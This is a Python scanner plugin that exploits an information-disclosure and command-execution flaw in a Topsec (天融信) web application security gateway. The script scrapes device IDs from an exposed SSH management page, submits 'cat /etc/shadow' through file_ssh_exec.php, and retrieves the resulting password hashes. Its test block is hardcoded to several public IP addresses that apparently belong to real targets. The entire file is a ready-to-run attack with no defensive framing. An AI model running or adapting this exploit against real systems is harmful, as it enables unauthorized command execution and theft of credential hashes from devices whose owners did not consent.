# -*- coding: utf-8 -*-
# @Time         : 2018-01-13
# @Plug-in name : 天融信WEB应用安全网关严重信息泄露漏洞
# @Plug-in ID   : s1172
# @Author       : 刘佳明
import requests
import re
from bs4 import BeautifulSoup
import time
requests.packages.urllib3.disable_warnings()
#reload(sys)
#sys.setdefaultencoding('utf-8')
#url = 'https://222.169.228.115/function/ssh/file_ssh.php'
def start(ip,port,pro):
    try:
        url = 'https://'+ip+'/function/ssh/file_ssh.php'
        url1 = 'https://'+ip+'/function/ssh/file_ssh_exec.php'
        r = requests.get(url,verify = False,timeout=5)
        def decode(req):
    	     encoding = req.encoding
    	     if encoding == 'ISO-8859-1':
    	         encodings = requests.utils.get_encodings_from_content(req.text)
    	         if encodings:
    	             encoding = encodings[0]
    	         else:
    	             encoding = req.apparent_encoding
    	     encode_content = req.content.decode(
    	         encoding, 'replace')
    	     return encode_content
         
        html = decode(r)
        soup = BeautifulSoup(html,'html.parser')
        #aa = soup.find_all(type="button")["onclick"]
        aa = soup.find_all(type = 'button',value = "执行命令",onclick= re.compile(r'^window.open'))
        rr = re.compile(r'file_ssh_exec.php.*\d')
        rrr = re.compile(r'id=\d')
        s = []
        for i in aa:
            aaa = rr.findall(str(i))
            aaaa = rrr.findall(str(aaa))[0]
            aaaa = aaaa.replace('id=','')
            s.append(aaaa)
       #s = re.search(r'file_ssh_exec.php?action=user_query&id=.',str(aa[0]))
        looks = []
        for i in range(len(s)):
            url2 = 'https://'+ip+'/function/ssh/file_ssh_exec.php?action=user_query&id='+s[i]
            d= {'cmd':'cat /etc/shadow','action':'user_cmd_submit','id':s[i]}
            r1 = requests.post(url1,data = d,verify = False,timeout=5)
            time.sleep(15)
            r2 = requests.get(url2,verify = False)
            soup1 = BeautifulSoup(r2.text,'html.parser')
            look = soup1.find_all(target='_blank')
            ll = re.compile(r'file_ssh_result\.php\?cmd_id=\d{0,}')
            ss = []
            for i in look:
                ss.append(ll.findall(str(i))[0])
            url3 = 'https://'+ip+'/function/ssh/'+ss[0]
            r3 =  requests.get(url3,verify = False,timeout=5)
            looks.append(r3.text)

        return 1,url2,url3,looks[0]
    except:
        return 0,0,0



        return looks
if __name__ == '__main__':
	#ip = '203.175.145.43'
	#ip = '1.189.195.125'
	ip = '111.42.141.164'
	#ip = '218.92.204.60'
	#ip = '1.189.195.125'
    #ip = '111.42.141.164'
	port = ''
	pro = ''
	print start(ip,port,pro)


